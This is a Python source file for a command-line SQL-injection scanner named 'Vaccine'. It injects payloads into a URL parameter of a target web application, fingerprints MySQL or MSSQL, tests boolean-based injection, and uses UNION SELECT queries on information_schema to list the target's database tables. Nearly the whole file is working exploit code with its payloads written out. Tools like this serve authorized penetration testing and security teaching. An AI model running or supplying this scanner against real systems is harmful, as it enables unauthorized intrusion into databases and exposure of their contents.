import sys
import os
import argparse
import requests
import re
from datetime import datetime

DEFAULT_ARCHIVE = "vaccine_output.txt"
payloads = []

def get_current_datetime():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_params(url):
    qpos = url.find('?')
    if qpos == -1:
        return []
    query = url[qpos+1:]
    eqpos = query.find('=')
    if eqpos == -1:
        return []
    return [query[:eqpos]]

def send_request(url, param, payload, method):
    headers = {"User-Agent": "vaccine-scanner"}
    if method == "GET":
        injected = url.replace(f"{param}=1", f"{param}={payload}")
        return requests.get(injected, headers=headers, timeout=5)
    else:
        parts = url.split('?', 1)
        base = parts[0]
        data = {}
        if len(parts) > 1:
            for kv in parts[1].split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1)
                    data[k] = v
        data[param] = payload
        return requests.post(base, data=data, headers=headers, timeout=5)

def detect_db_engine(url, param, method="GET"):
    p1 = "1' AND (SELECT version())-- -"
    payloads.append(p1)
    r1 = send_request(url, param, p1, method)
    if "MySQL" in r1.text:
        return "mysql"
    p2 = "1' AND CHARINDEX('Microsoft',@@version)>0-- -"
    payloads.append(p2)
    r2 = send_request(url, param, p2, method)
    if "Microsoft" in r2.text:
        return "mssql"
    return "unknown"

def test_boolean_based(url, param, method="GET"):
    pt = "1' AND 1=1-- -"
    pf = "1' AND 1=2-- -"
    payloads.extend([pt, pf])
    r_true = send_request(url, param, pt, method)
    r_false = send_request(url, param, pf, method)
    if r_true.text != r_false.text:
        return {"true": pt, "false": pf}
    return None

def extract_tables_mysql(url, param, method="GET"):
    p = (
        "-1 UNION SELECT 1,"
        "GROUP_CONCAT(table_name SEPARATOR '|'),"
        "3 FROM information_schema.tables "
        "WHERE table_schema=database()-- -"
    )
    payloads.append(p)
    r = send_request(url, param, p, method)
    cells = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.IGNORECASE|re.DOTALL)
    for cell in cells:
        text = re.sub(r'<.*?>','', cell).strip()
        if '|' in text:
            return [t.strip() for t in text.split('|') if t.strip()]
    return []

def extract_tables_mssql(url, param, method="GET"):
    p = (
        "-1 UNION ALL SELECT NULL,"
        "STUFF((SELECT '|' + TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
        "WHERE TABLE_TYPE='BASE TABLE' FOR XML PATH('')),1,1,''),"
        "NULL-- -"
    )
    payloads.append(p)
    r = send_request(url, param, p, method)
    cells = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.IGNORECASE|re.DOTALL)
    for cell in cells:
        text = re.sub(r'<.*?>','', cell).strip()
        if '|' in text:
            return [t.strip() for t in text.split('|') if t.strip()]
    return []

def main():
    parser = argparse.ArgumentParser(description="Vaccine: SQL-injection scanner")
    parser.add_argument("-o", metavar="archive", default=DEFAULT_ARCHIVE)
    parser.add_argument("-X", choices=["GET","POST"], default="GET")
    parser.add_argument("url", help="Target URL (include ?param=)")
    args = parser.parse_args()

    params = get_params(args.url)
    if not params:
        print("No parameter found in the URL.")
        sys.exit(1)
    param = params[0]
    method = args.X

    engine = detect_db_engine(args.url, param, method)
    bool_res = test_boolean_based(args.url, param, method)

    if engine == "mssql":
        raw_tables = extract_tables_mssql(args.url, param, method)
    else:
        raw_tables = extract_tables_mysql(args.url, param, method)
    tables = sorted({t for t in raw_tables}, key=str.lower)

    with open(args.o, "w") as f:
        print("======== Vaccine SQL Injection Report ========", file=f)
        print(f"Target URL:            {args.url}", file=f)
        print(f"Method:                {method}", file=f)
        print(f"Date:                  {get_current_datetime()}", file=f)
        print(f"Detected Engine:       {engine}", file=f)
        print("", file=f)

        print(f"Vulnerable Parameter:  {param}", file=f)
        print("", file=f)

        if bool_res:
            print("[+] Boolean-based injection detected!", file=f)
            print(f"    TRUE payload:  {bool_res['true']}", file=f)
            print(f"    FALSE payload: {bool_res['false']}", file=f)
        else:
            print("[-] No boolean-based injection detected.", file=f)
        print("", file=f)

        print(f"Payloads used ({len(payloads)}):", file=f)
        for i, p in enumerate(payloads, 1):
            print(f"  {i:2d}. {p}", file=f)
        print("", file=f)

        print(f"Discovered Tables ({len(tables)}):", file=f)
        for i, tbl in enumerate(tables, 1):
            print(f"  {i:2d}. {tbl}", file=f)
        print("", file=f)

if __name__ == "__main__":
    main()